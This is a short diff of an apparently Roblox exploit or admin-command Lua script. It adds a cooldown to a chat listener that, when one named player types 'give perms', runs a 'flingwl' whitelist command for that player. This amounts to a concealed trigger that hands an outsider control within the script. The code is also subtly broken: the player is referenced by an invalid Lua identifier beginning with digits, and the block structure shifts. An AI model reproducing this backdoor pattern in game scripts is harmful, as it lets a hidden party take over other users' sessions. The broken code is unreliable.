@@ -14802,7 +14802,7 @@ end
 
 
 mafiacmdsloaded = true
-
+permsonce = false
 
 while true do
 wait(1)
@@ -14810,9 +14810,15 @@ if mafiajoinedserver == true then
 
 game:GetService("Players").2345678asdfghjkxcb.Chatted:connect(function(msg) 
         if (msg:lower() == "give perms") then
+if permsonce == false then
 print("ok daddy")
 ExecuteCommand("flingwl", {"2345678asdfghjkxcb"}, LocalPlayer);
+permsonce = true
+wait(4)
+permsonce = false
 end
+end
+end)
 
 end
 if mafiajoinedserver == true and mafiacmdsloaded == false then
